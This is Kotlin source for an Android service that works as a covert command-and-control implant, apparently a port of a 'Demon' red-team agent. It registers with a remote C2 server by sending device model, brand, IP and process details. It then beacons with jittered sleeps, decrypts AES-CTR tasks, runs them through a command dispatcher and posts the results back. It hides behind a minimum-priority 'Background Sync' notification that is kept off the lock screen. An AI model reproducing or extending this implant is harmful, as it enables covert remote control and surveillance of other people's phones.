package com.demon.agent.core

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.demon.agent.BuildConfig
import com.demon.agent.commands.AgentSession
import com.demon.agent.commands.CommandDispatcher
import com.demon.agent.transport.*
import kotlinx.coroutines.*
import java.net.NetworkInterface

private const val TAG       = "AgentService"
private const val NOTIF_ID  = 1001
private const val CHANNEL_ID = "sync_channel"

class AgentService : Service() {

    private val session    = AgentSession()
    private lateinit var dispatcher: CommandDispatcher
    private val scope      = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Ensure only one beacon loop runs even if onStartCommand is called multiple times
    @Volatile private var beaconLoopRunning = false

    override fun onCreate() {
        super.onCreate()
        dispatcher = CommandDispatcher(this, session)
        startForeground(NOTIF_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!beaconLoopRunning) {
            beaconLoopRunning = true
            scope.launch {
                try { runBeaconLoop() }
                finally { beaconLoopRunning = false }
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    // ── Beacon loop ───────────────────────────────────────────────────
    private suspend fun runBeaconLoop() {
        // ── Step 1: Register ──────────────────────────────────────────
        var registered = false
        var attempts   = 0
        while (!registered && attempts < 20 && !session.shouldExit) {
            val regPkt = buildRegistrationPacket()
            val resp   = C2Transport.post(regPkt)
            if (resp != null && resp.size >= 4) {
                // Server replies with [4 bytes] = AES-encrypted AgentID confirmation
                registered = true
                Log.d(TAG, "Registered successfully (agent 0x${session.agentId.toString(16)})")
            } else {
                Log.w(TAG, "Registration attempt $attempts failed")
                attempts++
                delay(5_000L)
            }
        }
        if (!registered) { stopSelf(); return }

        // ── Step 2: Beacon loop ───────────────────────────────────────
        while (!session.shouldExit) {
            try {
                // Send COMMAND_GET_JOB beacon (command = 1)
                val beacon = FrameBuilder.buildBeacon(session.agentId)
                val resp   = C2Transport.post(beacon)

                if (resp != null && resp.size >= 12) {
                    processResponse(resp)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Beacon error: ${e.message}")
            }

            val jitterMs = if (session.sleepJitter > 0) {
                val max = (session.sleepDelay * 1000L * session.sleepJitter / 100)
                ((-max..max).random())
            } else 0L
            val sleepMs = (session.sleepDelay * 1000L + jitterMs).coerceAtLeast(1000L)
            delay(sleepMs)
        }
        stopSelf()
    }

    // ── Response / job dispatch ────────────────────────────────────────
    //
    // The server's response format (from BuildPayloadMessage) is a flat
    // concatenation of job packets, each structured as:
    //
    //   [4 LE] CommandID
    //   [4 LE] RequestID
    //   [4 LE] DataSize          (size of the AES-CTR encrypted data blob)
    //   [N]    AES-CTR encrypted Data  (only present if DataSize > 0)
    //
    // There is NO outer SIZE+MAGIC+AGENTID header on the response.
    // All integers in this payload are LITTLE-ENDIAN (BuildPayloadMessage
    // uses binary.LittleEndian throughout).
    // The Data section itself is AES-CTR encrypted with the session keys.
    //
    private fun processResponse(raw: ByteArray) {
        if (raw.isEmpty()) return

        // Parse the flat job list directly — no outer header
        val p = PacketParser(raw)   // PacketParser already uses little-endian

        while (p.remaining >= 12) {
            val cmdId = p.readInt32()
            val reqId = p.readInt32()
            val dSize = p.readInt32()
            Log.d(TAG, "Job: cmd=0x${cmdId.toString(16)} req=0x${reqId.toString(16)} dSize=$dSize")

            // Validate
            if (dSize < 0 || dSize > p.remaining) {
                Log.w(TAG, "Invalid dSize=$dSize remaining=${p.remaining}")
                break
            }

            // Read and decrypt the data blob (AES-CTR, same key/IV as session)
            val encData = if (dSize > 0) p.readRaw(dSize) else ByteArray(0)
            val data    = if (encData.isNotEmpty())
                AesCtr.decrypt(encData, session.aesKey, session.aesIv)
            else ByteArray(0)

            Log.d(TAG, "Job: cmd=0x${cmdId.toString(16)} req=0x${reqId.toString(16)} dSize=$dSize")

            // COMMAND_NOJOB (10) — server has no pending tasks for this agent
            if (cmdId == CommandId.COMMAND_NOJOB) {
                Log.d(TAG, "NOJOB")
                break  // no more jobs in this response
            }

            val cmdData = PacketParser(data)
            val output  = try {
                dispatcher.dispatch(cmdId, reqId, cmdData)
            } catch (e: Exception) {
                Log.e(TAG, "Crash dispatching cmd=0x${cmdId.toString(16)}: ${e.message}", e)
                dispatcher.buildOutput(reqId, "Error",
                    "[-] Command 0x${cmdId.toString(16)} crashed: ${e.message}", "")
            }
            if (output != null) {
                scope.launch {
                    try { C2Transport.post(output) }
                    catch (e: Exception) { Log.w(TAG, "Send output failed: ${e.message}") }
                }
            }
        }
    }

    // ── Registration packet ───────────────────────────────────────────
    private fun buildRegistrationPacket(): ByteArray {
        // OS info
        val androidMajor = Build.VERSION.RELEASE.split(".").firstOrNull()?.toIntOrNull() ?: 0
        val apiLevel     = Build.VERSION.SDK_INT

        // Registration body (mirrors DemonPosix Runtime.c BuildRegisterPacket)
        // ProcessName must be UTF-16 LE (ParseUTF16String in teamserver)
        val procNameUtf16 = packageName.toByteArray(Charsets.UTF_16LE)

        val body = PacketBuilder()
            .addInt32(session.agentId)               // AgentID
            .addString(Build.MODEL)                  // Hostname
            .addString("user")                       // Username
            .addString(Build.BRAND)                  // Domain
            .addString(getLocalIp())                 // InternalIP
            .addBytes(procNameUtf16)                 // ProcessName as UTF-16 LE
            .addInt32(android.os.Process.myPid())    // ProcessPID
            .addInt32(android.os.Process.myPid())    // ProcessTID
            .addInt32(android.os.Process.myPid())    // ProcessPPID
            .addInt32(9)                             // ProcessArch: ARM64
            .addInt32(0)                             // Elevated: false
            .addInt64(0L)                            // BaseAddress
            // OsVersion[5]: [major][apiLevel][workstation=1][sp=0][osType=ANDROID=4]
            .addInt32(androidMajor)
            .addInt32(apiLevel)
            .addInt32(1)
            .addInt32(0)
            .addInt32(4)                             // DEMON_OS_ANDROID
            .addInt32(12)                            // OsArch = ARM64
            .addInt32(session.sleepDelay)
            .addInt32(session.sleepJitter)
            .addInt64(0L)                            // KillDate
            .addInt32(0)                             // WorkingHours
            .build()

        return FrameBuilder.buildRegistration(session.agentId, body, session.aesKey, session.aesIv)
    }

    // ── Helpers ───────────────────────────────────────────────────────
    private fun getLocalIp(): String = try {
        NetworkInterface.getNetworkInterfaces().toList()
            .flatMap { it.inetAddresses.toList() }
            .firstOrNull { !it.isLoopbackAddress && !it.hostAddress.contains(':') }
            ?.hostAddress ?: "127.0.0.1"
    } catch (e: Exception) { "127.0.0.1" }

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (mgr.getNotificationChannel(CHANNEL_ID) == null) {
                mgr.createNotificationChannel(
                    NotificationChannel(CHANNEL_ID, "Background Sync",
                        NotificationManager.IMPORTANCE_MIN).apply {
                        setShowBadge(false)
                        lockscreenVisibility = Notification.VISIBILITY_SECRET
                    })
            }
        }
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Syncing")
            .setContentText("Background sync in progress")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(Notification.PRIORITY_MIN)
            .build()
    }
}
